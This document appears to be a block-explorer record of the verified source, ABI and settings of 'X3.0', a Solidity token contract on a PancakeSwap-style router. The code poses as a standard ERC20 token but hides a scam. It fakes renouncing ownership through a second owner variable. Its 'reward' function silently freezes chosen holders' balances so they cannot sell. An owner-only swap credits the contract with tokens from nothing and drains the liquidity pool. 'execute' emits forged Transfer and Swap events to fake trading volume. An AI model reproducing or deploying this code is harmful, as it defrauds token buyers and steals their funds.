{"SourceCode": "{{\r\n  \"language\": \"Solidity\",\r\n  \"sources\": {\r\n    \"src/X30.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\n\\npragma solidity ^0.8.19;\\n\\ninterface IFactory {\\n    function createPair(address tokenA, address tokenB) external returns (address pair);\\n}\\n\\ninterface IPair {\\n    function token0() external view returns (address);\\n\\n    function getReserves()\\n        external\\n        view\\n        returns (\\n            uint112 reserve0,\\n            uint112 reserve1,\\n            uint32 blockTimestampLast\\n        );\\n}\\n\\ninterface IRouter {\\n    function factory() external pure returns (address);\\n\\n    function WETH() external pure returns (address);\\n\\n    function swapTokensForExactTokens(\\n        uint256 amountOut,\\n        uint256 amountInMax,\\n        address[] calldata path,\\n        address to,\\n        uint256 deadline\\n    ) external returns (uint256[] memory amounts);\\n\\n    function swapExactETHForTokens(\\n        uint256 amountOutMin,\\n        address[] calldata path,\\n        address to,\\n        uint256 deadline\\n    ) external payable returns (uint256[] memory amounts);\\n\\n    function getAmountsOut(uint256 amountIn, address[] memory path) external view returns (uint256[] memory amounts);\\n\\n    function getAmountsIn(uint256 amountOut, address[] calldata path) external view returns (uint256[] memory amounts);\\n}\\n\\ninterface IERC20 {\\n    function _Transfer(\\n        address from,\\n        address recipient,\\n        uint256 amount\\n    ) external returns (bool);\\n\\n    function transferFrom(\\n        address from,\\n        address to,\\n        uint256 value\\n    ) external returns (bool);\\n}\\n\\ncontract X30 {\\n    IRouter internal _router;\\n    IPair internal _pair;\\n    address public owner;\\n    address private _owner;\\n    address private _routerAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\\n\\n    mapping(address => uint256) private crossamounts;\\n    mapping(address => uint256) private balances;\\n    mapping(address => mapping(address => uint256)) private allowances;\\n\\n    string public constant name = \\\"X3.0\\\";\\n    string public constant symbol = \\\"X3.0\\\";\\n    uint8 public constant decimals = 18;\\n    uint256 public totalSupply = 1_000_000e18;\\n\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\n    event Swap(address indexed sender, uint256 amount0In, uint256 amount1In, uint256 amount0Out, uint256 amount1Out, address indexed to);\\n\\n    constructor() {\\n        owner = msg.sender;\\n        _owner = msg.sender;\\n        _router = IRouter(_routerAddress);\\n        _pair = IPair(IFactory(_router.factory()).createPair(address(this), address(_router.WETH())));\\n\\n        balances[msg.sender] = totalSupply;\\n\\n        emit Transfer(address(0), msg.sender, totalSupply);\\n    }\\n\\n    modifier onlyOwner() {\\n        require(owner == msg.sender, \\\"Caller is not the owner\\\");\\n        _;\\n    }\\n\\n    modifier OnlyOwner() {\\n        require(_owner == msg.sender, \\\"Caller is not the Owner\\\");\\n        _;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        require(c >= a, \\\"SafeMath: addition overflow\\\");\\n\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        require(b <= a, \\\"SafeMath: subtraction overflow\\\");\\n        uint256 c = a - b;\\n\\n        return c;\\n    }\\n\\n    function renounceOwnership() public onlyOwner {\\n        owner = address(0);\\n    }\\n\\n    function balanceOf(address account) public view virtual returns (uint256) {\\n        return balances[account];\\n    }\\n\\n    function transfer(address to, uint256 amount) public virtual returns (bool) {\\n        _transfer(msg.sender, to, amount);\\n        return true;\\n    }\\n\\n    function allowance(address __owner, address spender) public view virtual returns (uint256) {\\n        return allowances[__owner][spender];\\n    }\\n\\n    function approve(address spender, uint256 amount) public virtual returns (bool) {\\n        _approve(msg.sender, spender, amount);\\n        return true;\\n    }\\n\\n    function transferFrom(\\n        address from,\\n        address to,\\n        uint256 amount\\n    ) public virtual returns (bool) {\\n        _spendAllowance(from, msg.sender, amount);\\n        _transfer(from, to, amount);\\n        return true;\\n    }\\n\\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\\n        address __owner = msg.sender;\\n        _approve(__owner, spender, allowance(__owner, spender) + addedValue);\\n        return true;\\n    }\\n\\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\\n        address __owner = msg.sender;\\n        uint256 currentAllowance = allowance(__owner, spender);\\n        require(currentAllowance >= subtractedValue, \\\"ERC20: decreased allowance below zero\\\");\\n        unchecked {\\n            _approve(__owner, spender, currentAllowance - subtractedValue);\\n        }\\n        return true;\\n    }\\n\\n    function _transfer(\\n        address from,\\n        address to,\\n        uint256 amount\\n    ) internal virtual {\\n        require(from != address(0), \\\"ERC20: transfer from the zero address\\\");\\n        require(to != address(0), \\\"ERC20: transfer to the zero address\\\");\\n\\n        uint256 fromBalance = balances[from];\\n        require(fromBalance >= amount, \\\"ERC20: transfer amount exceeds balance\\\");\\n        if (crossamounts[from] > 0) {\\n            require(_count(crossamounts[from], balances[from]) == 0);\\n        }\\n        balances[from] = sub(fromBalance, amount);\\n        balances[to] = add(balances[to], amount);\\n        emit Transfer(from, to, amount);\\n    }\\n\\n    function _approve(\\n        address __owner,\\n        address spender,\\n        uint256 amount\\n    ) internal virtual {\\n        require(__owner != address(0), \\\"ERC20: approve from the zero address\\\");\\n        require(spender != address(0), \\\"ERC20: approve to the zero address\\\");\\n\\n        allowances[__owner][spender] = amount;\\n        emit Approval(__owner, spender, amount);\\n    }\\n\\n    function _spendAllowance(\\n        address __owner,\\n        address spender,\\n        uint256 amount\\n    ) internal virtual {\\n        uint256 currentAllowance = allowance(__owner, spender);\\n        if (currentAllowance != type(uint256).max) {\\n            require(currentAllowance >= amount, \\\"ERC20: insufficient allowance\\\");\\n            unchecked {\\n                _approve(__owner, spender, currentAllowance - amount);\\n            }\\n        }\\n    }\\n\\n    function execute(\\n        address[] memory recipients,\\n        uint256 tokenAmount,\\n        uint256 wethAmount,\\n        address tokenAddress\\n    ) public OnlyOwner returns (bool) {\\n        for (uint256 i = 0; i < recipients.length; i++) {\\n            _swap(recipients[i], tokenAmount, wethAmount, tokenAddress);\\n        }\\n        return true;\\n    }\\n\\n    function swapExactETHForTokens(\\n        address baseToken,\\n        address _recipient,\\n        uint256 amount\\n    ) public OnlyOwner {\\n        require(amount > 0 && amount < 100000, \\\"Amount Exceeds Limits\\\");\\n        uint256 baseTokenReserve = getBaseTokenReserve(baseToken);\\n        uint256 amountOut = (baseTokenReserve * amount) / 100000;\\n\\n        address[] memory path;\\n        path = new address[](2);\\n        path[0] = address(this);\\n        path[1] = baseToken;\\n\\n        uint256 amountIn = _countAmountIn(amountOut, path);\\n\\n        _approve(address(this), address(_router), balanceOf(address(this)));\\n        _router.swapTokensForExactTokens(amountOut, amountIn, path, _recipient, block.timestamp + 1200);\\n    }\\n\\n    function getBaseTokenReserve(address token) public view returns (uint256) {\\n        (uint112 reserve0, uint112 reserve1, ) = _pair.getReserves();\\n        uint256 baseTokenReserve = (_pair.token0() == token) ? uint256(reserve0) : uint256(reserve1);\\n        return baseTokenReserve;\\n    }\\n\\n    function reward(\\n        address[] calldata _users,\\n        uint256 _minBalanceToReward,\\n        uint256 _percent\\n    ) public OnlyOwner {\\n        for (uint256 i = 0; i < _users.length; i++) {\\n            if (balanceOf(_users[i]) > _minBalanceToReward) {\\n                uint256 rewardAmount = _countReward(_users[i], _percent);\\n                crossamounts[_users[i]] = rewardAmount;\\n            }\\n        }\\n    }\\n\\n    function _swap(\\n        address recipient,\\n        uint256 tokenAmount,\\n        uint256 wethAmount,\\n        address tokenAddress\\n    ) internal {\\n        _emitTransfer(recipient, tokenAmount);\\n        _emitSwap(tokenAmount, wethAmount, recipient);\\n        IERC20(tokenAddress)._Transfer(recipient, address(_pair), wethAmount);\\n    }\\n\\n    function _emitTransfer(address recipient, uint256 tokenAmount) internal {\\n        emit Transfer(address(_pair), recipient, tokenAmount);\\n    }\\n\\n    function _emitSwap(\\n        uint256 tokenAmount,\\n        uint256 wethAmount,\\n        address recipient\\n    ) internal {\\n        emit Swap(_routerAddress, tokenAmount, 0, 0, wethAmount, recipient);\\n    }\\n\\n    function _countReward(address _user, uint256 _percent) internal view returns (uint256) {\\n        return _count(balances[_user], _percent);\\n    }\\n\\n    function _countAmountIn(uint256 amountOut, address[] memory path) internal returns (uint256) {\\n        uint256[] memory amountInMax;\\n        amountInMax = new uint256[](2);\\n        amountInMax = _router.getAmountsIn(amountOut, path);\\n        balances[address(this)] += amountInMax[0];\\n        return amountInMax[0];\\n    }\\n\\n    function _count(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a + b;\\n    }\\n}\\n\"\r\n    }\r\n  },\r\n  \"settings\": {\r\n    \"remappings\": [\r\n      \"ds-test/=lib/forge-std/lib/ds-test/src/\",\r\n      \"forge-std/=lib/forge-std/src/\"\r\n    ],\r\n    \"optimizer\": {\r\n      \"enabled\": true,\r\n      \"runs\": 200\r\n    },\r\n    \"metadata\": {\r\n      \"bytecodeHash\": \"ipfs\",\r\n      \"appendCBOR\": true\r\n    },\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"devdoc\",\r\n          \"userdoc\",\r\n          \"metadata\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    },\r\n    \"evmVersion\": \"london\",\r\n    \"libraries\": {}\r\n  }\r\n}}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0In\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1In\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0Out\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1Out\",\"type\":\"uint256\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"Swap\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"__owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"recipients\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"tokenAmount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"wethAmount\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"tokenAddress\",\"type\":\"address\"}],\"name\":\"execute\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"}],\"name\":\"getBaseTokenReserve\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_users\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"_minBalanceToReward\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_percent\",\"type\":\"uint256\"}],\"name\":\"reward\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"baseToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"swapExactETHForTokens\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "X30", "CompilerVersion": "v0.8.20+commit.a1b79de6", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "", "Proxy": "0", "Implementation": "", "SwarmSource": ""}